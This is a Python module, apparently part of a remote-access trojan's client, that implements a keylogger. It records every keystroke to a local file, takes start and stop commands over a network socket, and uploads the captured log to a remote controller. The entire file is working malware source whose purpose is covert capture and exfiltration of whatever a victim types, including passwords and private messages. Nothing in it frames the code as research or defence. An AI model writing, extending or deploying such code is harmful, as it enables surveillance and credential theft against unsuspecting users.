import threading
import time
try:
    from pynput import keyboard
except ImportError:
    keyboard = None
    print("[-] pynput library not found. Keylogger functionality will fail. Run: pip install pynput")
from .file_transfer import upload_file
from ..communication import send_data

keylogger_listener = None
keylog_file_name = "client_keylog.txt"
stop_keylogger_event = threading.Event()

def on_press(key):
    if stop_keylogger_event.is_set():
        return False
    try:
        with open(keylog_file_name, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(keylog_file_name, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                f.write("[TAB]")
            else:
                f.write(f" [{str(key)}] ")

def keylogger_thread_func():
    global keylogger_listener
    if not keyboard:
        print("[-] Keylogger cannot start: pynput.keyboard not available.")
        return
    with open(keylog_file_name, "w") as f:
        f.write(f"Keylogger started at {time.asctime()}\n")
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    keylogger_listener.join()
    with open(keylog_file_name, "a") as f:
        f.write(f"\nKeylogger stopped at {time.asctime()}\n")
    print("Keylogger listener thread finished.")

def start_keylogger(sock):
    global keylogger_listener
    if keylogger_listener and keylogger_listener.is_alive():
        send_data(sock, {"status": "info", "message": "Keylogger is already running."})
        return
    if not keyboard:
        send_data(sock, {"status": "error", "message": "pynput library not available for keylogger."})
        return
    stop_keylogger_event.clear()
    thread = threading.Thread(target=keylogger_thread_func, daemon=True)
    thread.start()
    send_data(sock, {"status": "success", "message": "Keylogger started."})

def stop_keylogger(sock):
    global keylogger_listener
    if not (keylogger_listener and keylogger_listener.is_alive()):
        send_data(sock, {"status": "info", "message": "Keylogger is not running or already stopped."})
        return
    stop_keylogger_event.set()
    if hasattr(keylogger_listener, 'stop'):
        keylogger_listener.stop()
    keylogger_listener = None
    send_data(sock, {"status": "success", "message": "Keylogger stop signal sent."})

def send_keylogs(sock):
    if not os.path.exists(keylog_file_name):
        send_data(sock, {"status": "error", "message": "Keylog file not found."})
        return
    upload_file(sock, keylog_file_name)